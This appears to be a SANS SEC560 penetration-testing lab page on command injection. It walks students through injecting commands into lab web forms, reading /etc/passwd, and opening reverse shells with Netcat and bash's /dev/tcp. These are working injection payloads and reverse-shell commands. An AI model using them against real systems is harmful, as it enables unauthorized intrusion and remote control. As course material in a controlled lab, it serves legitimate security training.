@@ -1,0 +1,304 @@
+<!DOCTYPE HTML>
+<!--
+    Editorial by HTML5 UP
+    html5up.net | @ajlkn
+    Free for personal and commercial use under the CCA 3.0 license (html5up.net/license)
+
+    560 Wiki made with love and care by the following people:
+    - Tim Medin (@TimMedin, @RedSiegeInfoSec) -- Project Lead, Red Siege Information Security
+    - Erik Van Buggenhout (@@ErikVaBu, @NVISOsecurity) -- Project Lead, NVISO Security
+    - Mick Douglas (@BetterSafetyNet) -- Tech lead, Intern Wrangler, InfoSec Innovations
+        - Yulli Chong -- Intern, InfoSec Innovations
+        - Aaron Sawyer (@CrashingStatic) -- Intern, InfoSec Innovations
+-->
+<html>
+    <head>
+        <title>SANS SEC560 Lab Wiki</title>
+        <meta charset="utf-8" />
+        <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no" />
+        <link rel="stylesheet" href="css/main.css" />
+    </head>
+    <body>
+
+        <!-- Wrapper -->
+            <div id="wrapper">
+
+                <!-- Main -->
+                    <div id="main">
+                        <div class="inner">
+
+                            <!-- Header -->
+                                <header id="header">
+                                    <a href="index.html" class="logo">SANS SEC 560 Lab Wiki</a>
+                                    <ul class="icons">
+                                        <li><a href="https://twitter.com/search?q=Sec560" class="icon fa-twitter"><span class="label">Twitter</span></a></li>
+                                    </ul>
+                                </header>
+
+                            <!-- Content -->
+                            <!-- Converted Markdown body (AKA HTML stubs) goes here -->
+<h1 id="lab-57-command-injection">Lab 5.7: Command Injection</h1>
+<h2 id="objectives">Objectives</h2>
+<ul>
+<li>To discover a non-blind command injection flaw by injecting <code>ping</code> commands into a target web application</li>
+<li>To discover a blind command injection flaw by injecting <code>ping</code> commands and sniffing for ICMP packets sent from the target</li>
+<li>To exploit a non-blind command injection flaw on a target website to get shell access</li>
+<li>To exploit a blind command injection flaw to get non-blind shell access, leveraging Netcat installed on the target machine</li>
+<li>To exploit a blind command injection flaw to get shell without using Netcat on the target but relying on bash&rsquo;s <code>/dev/tcp</code> feature instead for the reverse connection</li>
+</ul>
+<h2 id="lab-setup">Lab Setup</h2>
+<p>Ensure that you can ping <b>10.10.10.10</b>, <b>10.10.10.50</b>, and <b>10.10.10.60</b> in the 560 target environment from your Slingshot Linux machine.</p>
+<pre>
+sec560@slingshot~$ <b>ping 10.10.10.10</b>
+sec560@slingshot~$ <b>ping 10.10.10.50</b>
+sec560@slingshot~$ <b>ping 10.10.10.60</b>
+</pre>
+
+<h2 id="lab--step-by-step-instructions">Lab &ndash; Step-by-Step Instructions</h2>
+<p>For this lab, we&rsquo;ll be looking at two different applications with command injection flaws. On target <b>10.10.10.50</b>, the <b>index.php</b> function has a command injection flaw that will allow you to see the output of your commands right in the webpage response.</p>
+<p>Target <b>10.10.10.60</b> has a web application that is also vulnerable to command injection flaws, but this one will not display the output of a command to you. We&rsquo;ll perform blind command injection against this target. But note that we are going to analyze how to use blind command injection flaws to achieve more flexible access to the target machine.</p>
+<h4 id="step-1-identifying-command-injection">Step 1: Identifying command injection</h4>
+<p>Get your Linux system ready by launching Firefox to attack the target. You can launch Firefox by clicking the icon in the bar at the top of the screen.</p>
+<p>We will not be using ZAP to launch this attack, so make sure your browser is configured to not use a proxy. On the right side of your browser URL line, <b>right-click</b> the fox head icon and select <b>"Turn off FoxyProxy (Use Firefox settings)</b>.</p>
+<p><img  class="myImg"  src="pics/Ex5.7_E01_01_img00.png" style="width:100%;max-width:600px"  alt="Turn off proxy" /></p>
+<p>In Firefox, surf to <code>http://10.10.10.50/index.php</code>. In the form, we need to provide input that will make the target execute a command. This application works by taking user input and handing it to a program at the command shell. We need to provide some user input for the existing command in the application to process, terminate that command invoked by the web app with a semicolon, and then follow it with the command we want to execute, followed by another semicolon, followed by another command.</p>
+<p>To test this, first activate a sniffer on your Linux machine, configured to show ICMP messages associated with host <b>10.10.10.50</b>:</p>
+<pre>
+sec560@slingshot~$  <b>sudo tcpdump -n host 10.10.10.50 and icmp</b>
+</pre>
+
+<p>Then enter the following command into the form field on the website <b>10.10.10.50</b>:</p>
+<pre>
+<b>test; ping -c 4 <i>YOUR_LINUX_IP_ADDRESS</i>; echo hello</b>
+</pre>
+
+<p>Click the <b>Continue button</b>.</p>
+<p><img  class="myImg"  src="pics/Ex5.7_E01_01_img01.png" style="width:100%;max-width:600px"  alt="Test ping command" /></p>
+<p>In your <code>tcpdump</code> sniffer, you should display eight ICMP messages, pings from <b>10.10.10.50</b>, and your Linux machine&rsquo;s responses.</p>
+<p><img  class="myImg"  src="pics/Ex5.7_E01_01_img02.png" style="width:100%;max-width:600px"  alt="Tcpdump output" /></p>
+<p>Notice that the output of the <code>ping</code> command is displayed in your browser. Thus, we can try other commands, looking directly at their output. In the form field, enter:</p>
+<pre>
+<b>test; whoami; echo hello</b>
+</pre>
+
+<p>Then try:</p>
+<pre>
+<b>test; cat /etc/passwd; echo hello</b>
+</pre>
+
+<p><img  class="myImg"  src="pics/Ex5.7_E01_01_img02b.png" style="width:100%;max-width:600px"  alt="Test echo command" /></p>
+<p>When we can see the output of commands injected into a web app on a webpage, command injection is quite straightforward. But we don&rsquo;t always have that luxury.</p>
+<h4 id="step-2-looking-at-10101060">Step 2: Looking at 10.10.10.60</h4>
+<p>Consider the web application at <a href="http://10.10.10.60/research560/loginform.php">http://10.10.10.60/research560/loginform.php</a>.</p>
+<p>Note that this target is <code>.60</code>, not <code>.50</code>. This one has a command injection flaw as well, but it will not show you the output of commands. Let&rsquo;s try it as before.</p>
+<p>Run your sniffer looking for ICMP packets coming from host <code>10.10.10.60</code> <b>(NOT 10.10.10.50!)</b>:</p>
+<pre>
+sec560@slinghsot~$ <b>sudo tcpdump -n host 10.10.10.60 and icmp</b>
+</pre>
+
+<p>As shown on this slide, MAKE SURE YOU CHANGE YOUR SNIFFER&rsquo;S FILTER SO THAT IT FOCUSES ON PACKETS FOR 10.10.10.<b>60</b>, AND NOT 10.10.10.<b>50</b>.</p>
+<p>Now, in your browser, surf to <b><a href="http://10.10.10.60/research560/loginform.php">http://10.10.10.60/research560/loginform.php</a></b>.</p>
+<p>In the field for <b>Username</b>, type in the following:</p>
+<pre>
+<b>test; ping -c 4 <i>YOUR_LINUX_IP_ADDRESS</I>; echo hello</b>
+</pre>
+
+<p>Click the <b>Login button</b>.</p>
+<p><img  class="myImg"  src="pics/Ex5.7_E01_01_img03.png" style="width:100%;max-width:600px"  alt="Test ping in username field" /></p>
+<p>You should see the ICMP traffic in your sniffer, but you will not see the output of the <code>ping</code> command in your browser. You see a message saying that you had invalid credentials but no output from the <code>ping</code> command.</p>
+<p><img  class="myImg"  src="pics/Ex5.7_E01_01_img04.png" style="width:100%;max-width:600px"  alt="Tcpdump output" /></p>
+<p>Thus, we have a target application that is vulnerable to blind command injection. In your browser, click the <b>back button</b>. Verify that your command injection is indeed blind by entering a <b>Username</b> of:</p>
+<pre>
+<b>test; whoami; echo hello</b>
+</pre>
+
+<p>Although the <code>whoami</code> command will run, you won&rsquo;t see its output.</p>
+<h4 id="step-3-blind-command-injection">Step 3: Blind Command Injection</h4>
+<p>So, we can execute commands on the target but cannot see the output.</p>
+<p>How can a penetration tester or ethical hacker use this blind command injection capability to establish interactive shell access on the target? One option we have is to use Netcat. As you recall, Netcat is a handy TCP and UDP networking widget tool. If Netcat is installed on the target machine, we could use blind command injection to invoke it to get interactive shell access.</p>
+<p>Netcat just happens to be installed on the target in <code>/bin/nc</code>. Let&rsquo;s cause the web application to invoke it to make a reverse shell connection back to us. Start by running the following on your Linux box: a Netcat listener (<code>-l</code>), listening on a local port (<code>-p</code>) of your choosing, waiting for a connection:</p>
+<pre>
+sec560@slingshot~$ <b>nc -nvlp 9999</b>
+</pre>
+
+<blockquote>
+<p>Note: The options include a lowercase L, not a one.</p>
+</blockquote>
+<p>Then to make a reverse shell connection come from <b>10.10.10.60</b> back to your machine, enter the following username into the page at <b><a href="http://10.10.10.60/research560/loginform.php">http://10.10.10.60/research560/loginform.php</a></b>:</p>
+<pre>
+<b>test; /bin/nc <i>YOUR_LINUX_IP_ADDRESS 9999</i> -e /bin/bash; echo hello</b>
+</pre>
+
+<p>Click the <b>Login button</b> to make the application run your command.</p>
+<p><img  class="myImg"  src="pics/Ex5.7_E01_01_img05.png" style="width:100%;max-width:600px"  alt="Reverse shell connection" /></p>
+<p>Then, on your Linux machine, you should see an inbound connection. You won&rsquo;t see a command prompt come back because Netcat backdoor listeners created in this fashion don&rsquo;t provide a command prompt. But if your remote shell started properly, you should be able to type in shell commands, and they will run. You will likewise see their output. Type in commands such as <code>whoami</code>, <code>hostname</code>, <code>ls</code>, and <code>ifconfig</code>.</p>
+<p><img  class="myImg"  src="pics/Ex5.7_E01_01_img06.png" style="width:100%;max-width:600px"  alt="Shell commands" /></p>
+<p>When you finish, press <code>CTRL-C</code> to stop Netcat from running. We used blind command injection to get interactive reverse shell access to the target via Netcat.</p>
+<h4 id="4-netcat-without-netcat">4. Netcat without Netcat</h4>
+<p>Of course, for that technique to work, not only would Netcat have to be installed on the target machine, but the attacker would also have to know where Netcat is located in the file system.</p>
+<p>However, there is another way to get interactive shell access via command injection that doesn&rsquo;t require Netcat on the target. If the target machine is a Linux or UNIX system with <code>bash</code> installed, we likely can use <code>bash</code> and some network-related items inside <code>/dev</code> to mimic Netcat functionality. To get a feel for how this technique works, first, let&rsquo;s practice it locally to get a shell on our local box. Then we&rsquo;ll try it against our target.</p>
+<p>Start by running a Netcat listener, waiting for a connection on your Linux machine. This will model what the tester will run on his or her own machine to send a reverse shell to:</p>
+<pre>
+sec560@slingshot~$ <b>nc -nvlp 9999</b></pre>
+
+<p>Then, still on your Linux machine, run a command that will make an interactive shell connection using bash across the network:</p>
+<pre>
+sec560@slingshot~$ <b>/bin/bash -i > /dev/tcp/<i>YOUR_LINUX_IP_ADDRESS</i>/9999 0&lt;&1</b>
+</pre>
+
+<p><img  class="myImg"  src="pics/Ex5.7_E01_01_img07.png" style="width:100%;max-width:600px"  alt="Bash interactive shell connection" /></p>
+<p>When the connection is made, type in commands in your Netcat listener. Make sure you type the commands in the Netcat listener terminal, not the <code>/dev/tcp</code> terminal. They will execute, and you will see the results. We replaced Netcat with <code>bash</code>, redirect, and <code>/dev/tcp</code>!</p>
+<p>Note that we invoked <code>bash</code> in interactive mode (<code>-i</code>), directing its output to a TCP device that will tell our system to make a TCP connection across the network. The <code>0&lt;&amp;1</code> tells the system to duplicate the Standard Output file descriptor (<code>&amp;1</code>) and connect it to the Standard Input of <code>bash</code>. That way, we can send commands into bash. You could add <code>2&gt;&amp;1</code> to this command at the end and even get your shell prompt and Standard Error messages back.</p>
+<p>This bash with <code>/dev/tcp</code> technique to mimic Netcat works on any Linux or UNIX system with <code>bash</code> that allows redirects to and from the network via <code>/dev/tcp</code> or <code>/dev/udp</code>. That is, it works on most (but not all) Linux, Solaris, and FreeBSD systems. The technique does not work on Debian, Ubuntu, Knoppix, and related Linux systems because their <code>bash</code> installs were compiled so that they cannot redirect to the network via <code>/dev</code>.</p>
+<h4 id="5-devtcp-command-injection">5. dev/tcp command injection</h4>
+<p>Before moving forward, make sure you exit your Netcat session from the previous step by hitting <code>CTRL-C</code> on your <code>nc</code> terminal window.</p>
+<p>Now let&rsquo;s try this <code>/dev/tcp</code> technique on the target system with the blind command injection vulnerability. Start your Netcat listener to receive the reverse shell on your Linux machine, using our now-familiar command:</p>
+<pre>
+sec560@slingshot~$ <b>nc -nvlp 9999 </b>
+</pre>
+
+<blockquote>
+<p>Note: The options above include a lowercase L, not a one.</p>
+</blockquote>
+<p>Then, in the Username field, enter this command:</p>
+<pre>
+<b>test; /bin/bash -i > /dev/tcp/<i>YOUR_LINUX_IP_ADDRESS</i>/9999 0&lt;&1 2>&1; echo hello</b>
+</pre>
+
+<p>There must be a space between the <code>0&lt;&amp;1</code> and the <code>2&gt;&amp;1</code>. Click the <b>Login button</b> to submit your input.</p>
+<p><img  class="myImg"  src="pics/Ex5.7_E01_01_img08.png" style="width:100%;max-width:600px"  alt="Blind command injection " /></p>
+<p>Your Linux Netcat listener should get a connection with a shell prompt (because we redirected Standard Error with the <code>2&gt;&amp;1</code>). Type in commands here, such as <code>whoami</code>, <code>ifconfig</code>, <code>cat /etc/passwd</code>, and <code>hostname</code>. They are running on the target machine.</p>
+<p><img  class="myImg"  src="pics/Ex5.7_E01_01_img09.png" style="width:100%;max-width:600px"  alt="Shell prompt" /></p>
+<p>We&rsquo;ve gotten remote interactive command shell access via blind command injection on a Linux system without using Netcat, relying on a useful capability of <code>bash</code> and <code>/dev/tcp</code>.</p>
+<h2 id="conclusion">Conclusion</h2>
+<p>In this lab, we&rsquo;ve explored non-blind and blind command injection flaws, which provide a penetration tester an excellent opportunity for exploitation and gaining interactive shell access of a target machine. We leveraged Netcat installed on a target Linux machine to make a reverse shell connection back to our systems, and then explored how we could achieve similar functionality even if Netcat was not installed on the target. The use of Bash&rsquo;s <code>/dev/tcp</code> feature as a TCP client for such reverse shell connections is extremely useful.</p>
+
+                        </div>
+                    </div>
+
+                <!-- Sidebar -->
+                    <div id="sidebar">
+                        <div class="inner">
+
+                            <!-- Search -->
+                            <!-- MBD 20180705 - Search feature is disabled for now.  Will enable it once we get OK
+                                <input type="text" name="query" id="query" placeholder="Search" />
+                                    <button onclick="myFunction()">?</button>
+                                        <script>
+                                        function myFunction() {
+                                                var x = document.getElementById("query").value;
+                                               var res =  idx.search(x);
+                                            alert(res);
+                                       </script>
+                            -->
+
+                            <!-- Menu -->
+                                <nav id="menu">
+                                    <header class="major">
+                                        <h2>Menu</h2>
+                                    </header>
+                                    <ul>
+                                        <li><a href="index.html">Homepage</a></li>
+                                        <li><a href="Getting-Started.html">Getting Started</a></li>
+                                        <li>
+                                            <span class="opener">Book 1:</span>
+                                            <ul>
+                                                <li><a href="Lab-1.1-Setting-Up-The-Image.html">Setting Up The Image</a></li>
+                                                <li><a href="Lab-1.2-Scope-and-RoE-Role-Play.html">Scope and RoE Role Play</a></li>
+                                                <li><a href="Lab-1.3-Metadata-Treasure-Hunt.html">Metadata Treasure Hunt</a></li>
+                                                <li><a href="Lab-1.4-Recon-ng-for-DNS-Analysis.html">Recon-ng for DNS Analysis</a></li>
+                                            </ul>
+                                        </li>
+                                        <li>
+                                            <span class="opener">Book 2:</span>
+                                            <ul>
+                                            	<li><a href="Lab-2.1-Nmap.html">Nmap</a></li>
+                                            	<li><a href="Lab-2.2-Nmap-O-sV.html">Nmap -O -sV</a></li>
+                                                <li><a href="Lab-2.3-NSE.html">NSE</a></li>
+                                                <li><a href="Lab-2.4-Nessus.html">Nessus</a></li>
+                                                <li><a href="Lab-2.5-Netcat.html">Netcat</a></li>
+                                                <li><a href="Lab-2.6-PowerShell.html">PowerShell</a></li>
+                                            </ul>
+                                        </li>
+                                        <li>
+                                            <span class="opener">Book 3:</span>
+                                            <ul>
+                                                <li><a href="Lab-3.1-Metasploit.html">Metasploit</a></li>
+                                                <li><a href="Lab-3.2-Meterpreter.html">Meterpreter</a></li>
+                                                <li><a href="Lab-3.3-Veil.html">Veil</a></li>
+                                                <li><a href="Lab-3.4-Port-Pivot-Relays.html">Port Pivot Relays</a></li>
+                                                <li><a href="Lab-3.5-Empire.html">Empire</a></li>
+                                                <li><a href="Lab-3.6-Running-Commands-with-sc-and-WMIC.html">Running Commands with sc and WMIC</a></li>
+                                            </ul>
+                                        </li>
+                                        <li>
+                                            <span class="opener">Book 4:</span>
+                                            <ul>
+                                                <li><a href="Lab-4.1-Hydra-Password-Guessing.html">Hydra Password Guessing</a></li>
+                                                <li><a href="Lab-4.2-MSF-psexec-hashdump-kiwi.html">MSF psexec, hash dumping, and Kiwi</a></li>
+                                                <li><a href="Lab-4.3-MSF-pivots.html">MSF Pivots</a></li>
+                                                <li><a href="Lab-4.4-Cracking-with-JtR-and-Hashcat.html">Cracking with John the Ripper and Hashcat</a></li>
+                                                <li><a href="Lab-4.5-Sniffing-Cracking.html">Sniffing & Cracking</a></li>
+                                                <li><a href="Lab-4.6-Pass-the-Hash.html">Pash the Hash</a></li>
+                                            </ul>
+                                        </li>
+                                        <li>
+                                            <span class="opener">Book 5:</span>
+                                            <ul>
+                                                <li><a href="Lab-5.1-Kerberos.html">Kerberos</a></li>
+                                                <li><a href="Lab-5.2-Responder.html">Responder</a></li>
+                                                <li><a href="Lab-5.3-Bloodhound.html">Bloodhound</a></li>
+                                                <li><a href="Lab-5.4-Privilege-Escalation.html">Privilege Escalation</a></li>
+                                                <li><a href="Lab-5.5-Domain-Dominance.html">Domain Dominance</a></li>
+                                                <li><a href="Lab-5.6-ZAP-Proxy.html">ZAP Proxy</a></li>
+                                                <li><a href="Lab-5.7-Command-Injection.html">Command Injection</a></li>
+                                                <li><a href="Lab-5.8-SQL-Injection.html">SQL Injection</a></li>
+                                            </ul>
+                                        </li>
+                                        <li>
+                                            <span class="opener">Book 6:</span>
+                                            <ul>
+                                                <li><a href="Lab-6.1a-Connecting-to-the-Network.html">Connecting to the Network</a></li>
+                                                <li><a href="Lab-6.1b-Online-CTF-Access.html">Online CTF Access</a></li>
+                                            </ul>
+                                        </li>
+                                        <li>
+                                            <span class="opener">Cheatsheets</span>
+                                            <ul>
+                                                <li><a href="other/MetsploitCheatsheet.pdf">Metasploit</a></li>
+                                                <li><a href="other/NetcatCheatSheetV1.pdf">Netcat</a></li>
+                                                <li><a href="other/WindowsCommandLineSheetV1.pdf">Windows Command Line</a></li>
+                                            </ul>
+                                        </li>
+                                    </ul>
+                                </nav>
+
+
+
+                            <!-- Footer -->
+                                <footer id="footer">
+                                    <p class="copyright">&copy; Tim Medin<br>
+                                        All rights reserved. <br>
+                                        Design: <a href="https://html5up.net">HTML5 UP</a>.</p>
+                                </footer>
+
+                        </div>
+                    </div>
+
+            </div>
+
+            <!-- The Modal -->
+            <div id="myModal" class="modal">
+                <span class="close">&times;</span>
+                <img class="modal-content" id="img01">
+                <div id="caption"></div>
+            </div>
+
+        <!-- Scripts -->
+            <script src="js/jquery.min.js"></script>
+            <script src="js/skel.min.js"></script>
+            <script src="js/util.js"></script>
+            <script src="js/main.js"></script>
+
+    </body>
+</html>
